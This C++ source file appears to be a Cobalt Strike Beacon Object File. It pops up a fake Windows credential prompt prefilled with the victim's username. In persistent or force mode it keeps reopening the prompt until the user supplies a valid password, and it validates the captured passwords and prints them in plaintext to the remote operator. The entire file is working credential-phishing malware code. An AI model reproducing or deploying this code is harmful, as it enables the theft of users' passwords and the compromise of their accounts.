#define SECURITY_WIN32

#include "prompt.h"

#include <beacon.h>
#include <security.h>
#include <wincred.h>

#include "policy.h"

namespace {

struct PromptMonitor {
    HANDLE completed_event;
    HANDLE cancel_event;
    HANDLE stop_event;
    HWND parent;
    DWORD prompt_thread_id;
    DWORD timeout_ms;
    volatile LONG timed_out;
    volatile LONG cancelled;
    volatile LONG stopped;
};

BOOL CALLBACK close_owned_window(HWND window, LPARAM parameter) {
    auto* monitor = reinterpret_cast<PromptMonitor*>(parameter);
    const HWND owner = GetWindow(window, GW_OWNER);
    const HWND root_owner = GetAncestor(window, GA_ROOTOWNER);
    if (owner == monitor->parent || root_owner == monitor->parent) {
        PostMessageW(window, WM_CLOSE, 0, 0);
    }
    return TRUE;
}

// On Windows 11 build 26100+, CredUIPromptForWindowsCredentialsW delegates to
// CredentialUIBroker.exe.  The dialog belongs to that process, so
// EnumThreadWindows on the calling thread finds nothing.  This callback finds
// the broker's dialog by class name and terminates the broker process.  When
// the broker dies the RPC channel breaks and CredUIPromptForWindowsCredentialsW
// returns an error in the calling process.  The caller checks the monitor's
// timed_out/stopped/cancelled flags first, so the specific error code from
// CredUI does not matter.
BOOL CALLBACK dismiss_broker_dialog(HWND window, LPARAM parameter) {
    wchar_t class_name[64]{};
    if (GetClassNameW(window, class_name, 64) <= 0) {
        return TRUE;
    }
    if (lstrcmpW(class_name, L"Credential Dialog Xaml Host") != 0) {
        return TRUE;
    }
    DWORD window_pid = 0;
    GetWindowThreadProcessId(window, &window_pid);
    if (window_pid == 0 || window_pid == GetCurrentProcessId()) {
        return TRUE;
    }
    DWORD window_session = 0;
    DWORD our_session = 0;
    ProcessIdToSessionId(window_pid, &window_session);
    ProcessIdToSessionId(GetCurrentProcessId(), &our_session);
    if (window_session != our_session) {
        return TRUE;
    }
    HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, window_pid);
    if (process != nullptr) {
        TerminateProcess(process, 0);
        CloseHandle(process);
    }
    auto* found = reinterpret_cast<bool*>(parameter);
    *found = true;
    return FALSE;
}

DWORD WINAPI monitor_prompt(void* parameter) {
    auto* monitor = static_cast<PromptMonitor*>(parameter);
    HANDLE events[] = {
        monitor->completed_event,
        monitor->cancel_event,
        monitor->stop_event,
    };
    const DWORD result = WaitForMultipleObjects(3, events, FALSE, monitor->timeout_ms);
    if (result == WAIT_OBJECT_0) {
        return 0;
    }
    if (result == WAIT_OBJECT_0 + 1) {
        InterlockedExchange(&monitor->cancelled, 1);
    } else if (result == WAIT_OBJECT_0 + 2) {
        // The C2 stopped the job, close the dialog the same way as a cancel
        InterlockedExchange(&monitor->stopped, 1);
    } else if (result == WAIT_TIMEOUT) {
        InterlockedExchange(&monitor->timed_out, 1);
    } else {
        return 0;
    }
    // In-process dialog (older builds): close windows owned by the parent
    EnumThreadWindows(
        monitor->prompt_thread_id,
        close_owned_window,
        reinterpret_cast<LPARAM>(monitor));
    // Broker-hosted dialog (Windows 11 26100+): terminate the broker
    // process so the RPC breaks and CredUI returns.  Retry until CredUI
    // returns or the dialog is gone.
    for (int attempt = 0; attempt < 20; ++attempt) {
        if (WaitForSingleObject(monitor->completed_event, 150) == WAIT_OBJECT_0) {
            break;
        }
        bool found = false;
        EnumWindows(dismiss_broker_dialog, reinterpret_cast<LPARAM>(&found));
        if (!found) {
            break;
        }
    }
    return 0;
}

void release_prompt_buffer(void* buffer, DWORD size) {
    if (buffer != nullptr) {
        secure_zero(buffer, size);
        CoTaskMemFree(buffer);
    }
}

void release_prefill_buffer(void* buffer, DWORD size) {
    if (buffer != nullptr) {
        secure_zero(buffer, size);
        HeapFree(GetProcessHeap(), 0, buffer);
    }
}

bool create_prefill(void** buffer, DWORD* size) {
    *buffer = nullptr;
    *size = 0;
    wchar_t identity[512]{};
    ULONG identity_chars = static_cast<ULONG>(sizeof(identity) / sizeof(identity[0]));
    if (!GetUserNameExW(NameSamCompatible, identity, &identity_chars)) {
        return false;
    }

    CredPackAuthenticationBufferW(0, identity, const_cast<wchar_t*>(L""), nullptr, size);
    if (*size == 0 || GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        secure_zero(identity, sizeof(identity));
        return false;
    }
    const DWORD allocated_size = *size;
    *buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, allocated_size);
    if (*buffer == nullptr) {
        secure_zero(identity, sizeof(identity));
        *size = 0;
        return false;
    }
    const bool packed = CredPackAuthenticationBufferW(
        0,
        identity,
        const_cast<wchar_t*>(L""),
        static_cast<unsigned char*>(*buffer),
        size) != FALSE;
    secure_zero(identity, sizeof(identity));
    if (!packed) {
        release_prefill_buffer(*buffer, allocated_size);
        *buffer = nullptr;
        *size = 0;
    }
    return packed;
}

}  // namespace

PromptResult run_prompt(
    HWND parent,
    HANDLE cancel_event,
    HANDLE stop_event,
    const wchar_t* caption,
    const wchar_t* message,
    const AppSettings& settings,
    const TargetInfo& target,
    Credentials* credentials,
    DWORD* error_code) {
    if (parent == nullptr || cancel_event == nullptr || stop_event == nullptr ||
        caption == nullptr || message == nullptr || credentials == nullptr) {
        if (error_code != nullptr) {
            *error_code = ERROR_INVALID_PARAMETER;
        }
        return PromptResult::error;
    }

    void* prefill = nullptr;
    DWORD prefill_size = 0;
    create_prefill(&prefill, &prefill_size);

    const bool has_deadline = settings.timeout_seconds != kNoTimeout;
    const ULONGLONG deadline = GetTickCount64() +
        static_cast<ULONGLONG>(settings.timeout_seconds) * 1000ULL;
    DWORD last_auth_error = ERROR_SUCCESS;
    PromptResult final_result = PromptResult::error;

    unsigned int submitted_attempts = 0;
    while (submitted_attempts < settings.max_attempts) {
        // Validation between attempts can take a while, so check for a
        // stop request before reopening the prompt
        if (WaitForSingleObject(stop_event, 0) == WAIT_OBJECT_0) {
            credentials->clear();
            final_result = PromptResult::stopped;
            break;
        }

        const ULONGLONG now = GetTickCount64();
        if (has_deadline && now >= deadline) {
            final_result = PromptResult::timed_out;
            break;
        }
        const DWORD remaining_ms = has_deadline
            ? static_cast<DWORD>(deadline - now)
            : INFINITE;

        HANDLE completed = CreateEventW(nullptr, TRUE, FALSE, nullptr);
        if (completed == nullptr) {
            if (error_code != nullptr) {
                *error_code = GetLastError();
            }
            break;
        }

        PromptMonitor monitor{
            completed,
            cancel_event,
            stop_event,
            parent,
            GetCurrentThreadId(),
            remaining_ms,
            0,
            0,
            0,
        };
        HANDLE monitor_thread = CreateThread(nullptr, 0, monitor_prompt, &monitor, 0, nullptr);
        if (monitor_thread == nullptr) {
            if (error_code != nullptr) {
                *error_code = GetLastError();
            }
            CloseHandle(completed);
            break;
        }

        CREDUI_INFOW info{};
        info.cbSize = sizeof(info);
        info.hwndParent = parent;
        info.pszCaptionText = caption;
        info.pszMessageText = message;
        ULONG auth_package = 0;
        BOOL save = FALSE;
        void* packed = nullptr;
        ULONG packed_size = 0;
        const DWORD prompt_result = CredUIPromptForWindowsCredentialsW(
            &info,
            last_auth_error,
            &auth_package,
            prefill,
            prefill_size,
            &packed,
            &packed_size,
            &save,
            CREDUIWIN_GENERIC);

        SetEvent(completed);
        WaitForSingleObject(monitor_thread, INFINITE);
        CloseHandle(monitor_thread);
        CloseHandle(completed);

        if (monitor.timed_out != 0) {
            release_prompt_buffer(packed, packed_size);
            final_result = PromptResult::timed_out;
            break;
        }
        if (monitor.cancelled != 0) {
            release_prompt_buffer(packed, packed_size);
            final_result = PromptResult::cancelled;
            break;
        }
        if (monitor.stopped != 0) {
            release_prompt_buffer(packed, packed_size);
            credentials->clear();
            final_result = PromptResult::stopped;
            break;
        }
        if (prompt_result != ERROR_SUCCESS) {
            release_prompt_buffer(packed, packed_size);
            if (prompt_result == ERROR_CANCELLED && settings.persistent) {
                BeaconPrintf(
                    CALLBACK_OUTPUT,
                    "\n\n[!] User tried to close the prompt\n[*] Reopening prompt\n");
                last_auth_error = ERROR_SUCCESS;
                continue;
            }
            final_result = prompt_result == ERROR_CANCELLED
                ? PromptResult::cancelled
                : PromptResult::error;
            if (error_code != nullptr) {
                *error_code = prompt_result;
            }
            break;
        }

        DWORD unpack_error = ERROR_SUCCESS;
        const bool unpacked = unpack_credentials(
            packed,
            packed_size,
            credentials,
            &unpack_error);
        release_prompt_buffer(packed, packed_size);
        if (!unpacked) {
            if (error_code != nullptr) {
                *error_code = unpack_error;
            }
            final_result = PromptResult::error;
            break;
        }
        if (credentials->username[0] == L'\0' ||
            !has_nonempty_password(credentials->password)) {
            last_auth_error = ERROR_LOGON_FAILURE;
            credentials->clear();
            if (settings.persistent) {
                continue;
            }
            ++submitted_attempts;
            final_result = PromptResult::attempts_exhausted;
            continue;
        }
        ++submitted_attempts;
        if (!settings.validate) {
            final_result = PromptResult::captured;
            break;
        }

        if (validate_credentials(*credentials, target, &last_auth_error)) {
            final_result = PromptResult::validated;
            break;
        }
        if (error_code != nullptr) {
            *error_code = last_auth_error;
        }
        if (settings.force) {
            // Force mode: reopen after failed validation, don't count
            // against max_attempts. The prompt stays open until the user
            // enters a valid password, the operator stops the job, or the
            // timeout expires. Print each attempt so the operator sees
            // what was tried.
            if (credentials->domain[0] != L'\0') {
                BeaconPrintf(
                    CALLBACK_OUTPUT,
                    "\n\n[+] Identity: %ls\\%ls\n[+] Password: %ls\n[-] Validation failed (error=%u)\n[*] Reopening prompt\n",
                    credentials->domain,
                    credentials->username,
                    credentials->password,
                    last_auth_error);
            } else {
                BeaconPrintf(
                    CALLBACK_OUTPUT,
                    "\n\n[+] Identity: %ls\n[+] Password: %ls\n[-] Validation failed (error=%u)\n[*] Reopening prompt\n",
                    credentials->username,
                    credentials->password,
                    last_auth_error);
            }
            credentials->clear();
            --submitted_attempts;
            continue;
        }
        final_result = PromptResult::attempts_exhausted;
        if (submitted_attempts < settings.max_attempts) {
            credentials->clear();
        }
    }

    release_prefill_buffer(prefill, prefill_size);
    return final_result;
}
